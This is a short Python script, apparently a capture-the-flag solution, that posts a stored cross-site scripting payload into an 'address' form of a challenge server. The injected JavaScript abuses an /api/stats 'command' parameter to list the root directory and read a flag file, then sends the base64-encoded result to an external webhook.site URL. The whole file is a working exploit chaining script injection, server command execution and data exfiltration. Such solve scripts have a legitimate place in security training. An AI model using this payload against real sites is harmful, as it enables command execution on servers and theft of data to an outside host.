#!/usr/bin/env python3

import requests

HOST, PORT = "0.0.0.0", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"
WEBHOOK_URL = "https://webhook.site/64385842-d826-467c-a877-7604335cd237"

def main():
    form_data = {
        "address": f"<script>(async () => {{let response = await fetch('/api/stats?command=ls+/');let flag = await response.text();response = await fetch('/api/stats?command=cat+/flag' + flag.split('flag')[1].substr(0, 10) + '.txt');flag = await response.text();await fetch('{WEBHOOK_URL}?c=' + btoa(flag))}})()</script>"
    }

    requests.post(f"{CHALLENGE_URL}/add/address", data=form_data)


if __name__ == "__main__":
    main()
